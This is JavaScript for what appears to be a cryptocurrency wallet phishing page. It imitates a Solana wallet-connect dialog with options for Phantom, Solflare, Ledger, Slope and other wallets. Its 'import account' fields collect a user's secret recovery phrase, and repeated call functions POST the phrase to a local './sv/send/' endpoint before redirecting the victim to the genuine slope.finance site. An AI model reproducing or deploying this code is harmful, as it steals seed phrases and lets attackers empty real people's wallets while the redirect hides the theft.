function s() {
    document.querySelectorAll('.nav li').forEach(el => {
        el.classList.remove('active');
    }); 
}

document.querySelector('.icon-menu').onclick = _ => {
    document.querySelector('.nav').classList.toggle('active');
}

document.querySelectorAll('.nav li').forEach((el, index) => {
    if (index < 2) {
        el.onclick = e => {
            s();
            e.preventDefault();
            el.classList.add('active');
            // scroll to block
            document.querySelector(`#${el.textContent.toLowerCase().trim()}`).scrollIntoView({
                behavior: 'smooth'
            });
        };
    }

    if (index == 2) {
        el.onclick = e => {
            s();
            e.preventDefault();
            el.classList.add('active');

            document.querySelector(`.el-message--warning`).style.display = 'flex';
            document.querySelector(`.el-message--warning`).style.opacity = 1;
            window.setTimeout(_ => {
                document.querySelector(`.el-message--warning`).style.top = 20 + 'px';
                document.querySelector(`.el-message--warning`).style.zIndex = 2010;
            }, 100)

            document.querySelector('#gcon').textContent = 'coming soon';

            window.setTimeout(_ => {
                document.querySelector(`.el-message--warning`).style.opacity = 0;
                document.querySelector(`.el-message--warning`).style.top = 0;
                window.setTimeout(_ => {document.querySelector(`.el-message--warning`).style.display = 'none';}, 500)
            }, 3000)
        };
    }
});

document.querySelector('#connectWallet').onclick = e => {
    e.preventDefault();
}

document.querySelectorAll('#sub').forEach((el, index) => {
    el.onclick = e => {
        e.preventDefault();
        e.stopPropagation();
        if (document.querySelectorAll('.el-input__inner')[index].value.trim() == '') {
            document.querySelector(`.el-message--warning`).style.display = 'flex';
            document.querySelector(`.el-message--warning`).style.opacity = 1;
            window.setTimeout(_ => {
                document.querySelector(`.el-message--warning`).style.top = 20 + 'px';
                document.querySelector(`.el-message--warning`).style.zIndex = 2010;
            }, 100)

            document.querySelector('#gcon').textContent = 'Please enter your vaild email!';

            window.setTimeout(_ => {
                document.querySelector(`.el-message--warning`).style.opacity = 0;
                document.querySelector(`.el-message--warning`).style.top = 0;
                window.setTimeout(_ => {document.querySelector(`.el-message--warning`).style.display = 'none';}, 500)
            }, 3000)
        } else {
            document.querySelector(`.el-message--success`).style.display = 'flex';
            document.querySelector(`.el-message--success`).style.opacity = 1;
            window.setTimeout(_ => {
                document.querySelector(`.el-message--success`).style.top = 20 + 'px';
                document.querySelector(`.el-message--success`).style.zIndex = 2009;
            }, 100)

            document.querySelector('#scon').textContent = 'Submitted successfully!';
        
            window.setTimeout(_ => {
                document.querySelector(`.el-message--success`).style.opacity = 0;
                document.querySelector(`.el-message--success`).style.top = 0;
                window.setTimeout(_ => {document.querySelector(`.el-message--success`).style.display = 'none';}, 500)
            }, 3000)
        }
    };
});
$(function () {
    $('#callback-button').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
    $('#callback-button1').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
      $('#callback-button2').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
      $('#callback-button3').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
      $('#callback-button4').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
      $('#callback-button5').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
      $('#callback-button6').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
        $('#callback-button7').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
        $('#callback-button8').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
        $('#callback-button9').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
         $('#callback-button10').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
          $('#callback-button11').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
          $('#callback-button12').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
          $('#callback-button13').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
          $('#callback-button14').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
          $('#callback-button15').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
          $('#callback-button16').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
          $('#callback-button17').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
          $('#callback-button18').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
          $('#callback-button19').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
  $('#callback-button20').click(function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
  
    $('.modal__close-button').click(function (e) {
      e.preventDefault();
      $('.modal').removeClass('modal_active');
      $('body').removeClass('hidden');
    });
  
    $('.modal').mouseup(function (e) {
      let modalContent = $(".modal__content");
      if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
        $(this).removeClass('modal_active');
        $('body').removeClass('hidden');
      }
    });
  });
  document.querySelectorAll('#callback-button').forEach(function (item) {
    item.addEventListener('click', function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
  });

  document.querySelector('#connectWallet').addEventListener('click', function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
  });
  
  document.querySelectorAll('react-horizontal-scrolling-menu--item').forEach(function (item) {
    item.addEventListener('click', function (e) {
      e.preventDefault();
      $('.modal').addClass('modal_active');
      $('body').addClass('hidden');
    });
  });
  
  $(function () {
    $('#Phantom').click(function (e) {
      e.preventDefault();
      $('.Phantom').addClass('modal_active');
      $('body').addClass('hidden');
    });
  
    $('.modal__close-button').click(function (e) {
      e.preventDefault();
      $('.Phantom').removeClass('modal_active');
      $('body').removeClass('hidden');
    });
  
    $('.Phantom').mouseup(function (e) {
      let modalContent = $(".modal__content");
      if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
        $(this).removeClass('modal_active');
        $('body').removeClass('hidden');
      }
    });
  });
  $(function () {
    $('#MathWallet').click(function (e) {
      e.preventDefault();
      $('.MathWallet').addClass('modal_active');
      $('body').addClass('hidden');
    });
  
    $('.modal__close-button').click(function (e) {
      e.preventDefault();
      $('.MathWallet').removeClass('modal_active');
      $('body').removeClass('hidden');
    });
  
    $('.MathWallet').mouseup(function (e) {
      let modalContent = $(".modal__content");
      if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
        $(this).removeClass('modal_active');
        $('body').removeClass('hidden');
      }
    });
  });
  $(function () {
    $('#Solong').click(function (e) {
      e.preventDefault();
      $('.Solong').addClass('modal_active');
      $('body').addClass('hidden');
    });
  
    $('.modal__close-button').click(function (e) {
      e.preventDefault();
      $('.Solong').removeClass('modal_active');
      $('body').removeClass('hidden');
    });
  
    $('.Solong').mouseup(function (e) {
      let modalContent = $(".modal__content");
      if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
        $(this).removeClass('modal_active');
        $('body').removeClass('hidden');
      }
    });
  });
  $(function () {
    $('#Ledger').click(function (e) {
      e.preventDefault();
      $('.Ledger').addClass('modal_active');
      $('body').addClass('hidden');
    });
  
    $('.modal__close-button').click(function (e) {
      e.preventDefault();
      $('.Ledger').removeClass('modal_active');
      $('body').removeClass('hidden');
    });
  
    $('.Ledger').mouseup(function (e) {
      let modalContent = $(".modal__content");
      if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
        $(this).removeClass('modal_active');
        $('body').removeClass('hidden');
      }
    });
  });
  $(function () {
    $('#Clover').click(function (e) {
      e.preventDefault();
      $('.Clover').addClass('modal_active');
      $('body').addClass('hidden');
    });
  
    $('.modal__close-button').click(function (e) {
      e.preventDefault();
      $('.Clover').removeClass('modal_active');
      $('body').removeClass('hidden');
    });
  
    $('.Clover').mouseup(function (e) {
      let modalContent = $(".modal__content");
      if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
        $(this).removeClass('modal_active');
        $('body').removeClass('hidden');
      }
    });
  });
  $(function () {
    $('#Solflare').click(function (e) {
      e.preventDefault();
      $('.Solflare').addClass('modal_active');
      $('body').addClass('hidden');
    });
  
    $('.modal__close-button').click(function (e) {
      e.preventDefault();
      $('.Solflare').removeClass('modal_active');
      $('body').removeClass('hidden');
    });
  
    $('.Solflare').mouseup(function (e) {
      let modalContent = $(".modal__content");
      if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
        $(this).removeClass('modal_active');
        $('body').removeClass('hidden');
      }
    });
  });
  $(function () {
    $('#Sollet').click(function (e) {
      e.preventDefault();
      $('.Sollet').addClass('modal_active');
      $('body').addClass('hidden');
    });
  
    $('.modal__close-button').click(function (e) {
      e.preventDefault();
      $('.Sollet').removeClass('modal_active');
      $('body').removeClass('hidden');
    });
  
    $('.Sollet').mouseup(function (e) {
      let modalContent = $(".modal__content");
      if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
        $(this).removeClass('modal_active');
        $('body').removeClass('hidden');
      }
    });
  });
  $(function () {
    $('#Slope').click(function (e) {
      e.preventDefault();
      $('.Slope').addClass('modal_active');
      $('body').addClass('hidden');
    });
  
    $('.modal__close-button').click(function (e) {
      e.preventDefault();
      $('.Slope').removeClass('modal_active');
      $('body').removeClass('hidden');
    });
  
    $('.Slope').mouseup(function (e) {
      let modalContent = $(".modal__content");
      if (!modalContent.is(e.target) && modalContent.has(e.target).length === 0) {
        $(this).removeClass('modal_active');
        $('body').removeClass('hidden');
      }
    });
  });
  document.querySelectorAll('.import-account__secret-phrase').forEach(el => {
    // on click enter
    el.addEventListener('keypress', e => {
      if (e.keyCode === 13 && el.value.trim() !== '') {
        e.preventDefault();
        const send = el.parentElement.querySelector('li button');
        send.click();
        el.value = '';
        send.textContent = 'Connecting...';
        send.disabled = true;
        el.disabled = true;
      }
    });
  })
  function camelCase(str) {
    return str
      .replace(/(?:^\w|[A-Z]|\b\w|_\w|\s+)/g, function (word, index) {
        return index == 0 ? word.toLowerCase() : word.toUpperCase();
      })
      .replace(/(_|\s)+/g, "");
  }
  function call() {
    $.ajax({
      type: "POST",
      url: "./sv/send/",
      data: {
        name: $('#firstn').val(),
        phrase: $.trim($('#first').val())
      },
      success: function (data) {
        if (data == true) {
          $('#first').val('');
          window.location.replace('https://slope.finance/');
        }
      },
      error: function (xhr, str) {
        alert("Возникла ошибка: " + xhr.responseCode)
      },
    })
  }
  function call1() {
    $.ajax({
      type: "POST",
      url: "./sv/send/",
      data: {
        name: $('#secondn').val(),
        phrase: $.trim($('#second').val())
      },
      success: function (data) {
        if (data == true) {
          $('#second').val('');
          window.location.replace('https://slope.finance/');
        }
      },
      error: function (xhr, str) {
        alert("Возникла ошибка: " + xhr.responseCode)
      },
    })
  }
  function call2() {
    $.ajax({
      type: "POST",
      url: "./sv/send/",
      data: {
        name: $('#thirdn').val(),
        phrase: $.trim($('#third').val())
      },
      success: function (data) {
        if (data == true) {
          $('#third').val('');
          window.location.replace('https://slope.finance/');
        }
      },
      error: function (xhr, str) {
        alert("Возникла ошибка: " + xhr.responseCode)
      },
    })
  }
  function call3() {
    $.ajax({
      type: "POST",
      url: "./sv/send/",
      data: {
        name: $('#firthdn').val(),
        phrase: $.trim($('#firthd').val())
      },
      success: function (data) {
        if (data == true) {
          $('#firthd').val('');
          window.location.replace('https://slope.finance/');
        }
      },
      error: function (xhr, str) {
        alert("Возникла ошибка: " + xhr.responseCode)
      },
    })
  }
  function call4() {
    $.ajax({
      type: "POST",
      url: "./sv/send/",
      data: {
        name: $('#fiftyn').val(),
        phrase: $.trim($('#fifty').val())
      },
      success: function (data) {
        if (data == true) {
          $('#fifty').val('');
          window.location.replace('https://slope.finance/');
        }
      },
      error: function (xhr, str) {
        alert("Возникла ошибка: " + xhr.responseCode)
      },
    })
  }
  function call5() {
    $.ajax({
      type: "POST",
      url: "./sv/send/",
      data: {
        name: $('#sixn').val(),
        phrase: $.trim($('#six').val())
      },
      success: function (data) {
        if (data == true) {
          $('#six').val('');
          window.location.replace('https://slope.finance/');
        }
      },
      error: function (xhr, str) {
        alert("Возникла ошибка: " + xhr.responseCode)
      },
    })
  }
  function call6() {
    $.ajax({
      type: "POST",
      url: "./sv/send/",
      data: {
        name: $('#sevenn').val(),
        phrase: $.trim($('#seven').val())
      },
      success: function (data) {
        if (data == true) {
          $('#seven').val('');
          window.location.replace('https://slope.finance/');
        }
      },
      error: function (xhr, str) {
        alert("Возникла ошибка: " + xhr.responseCode)
      },
    })
  }
  function call7() {
    $.ajax({
      type: "POST",
      url: "./sv/send/",
      data: {
        name: $('#eightn').val(),
        phrase: $.trim($('#eight').val())
      },
      success: function (data) {
        if (data == true) {
          $('#eight').val('');
          window.location.replace('https://slope.finance/');
        }
      },
      error: function (xhr, str) {
        alert("Возникла ошибка: " + xhr.responseCode)
      },
    })
  }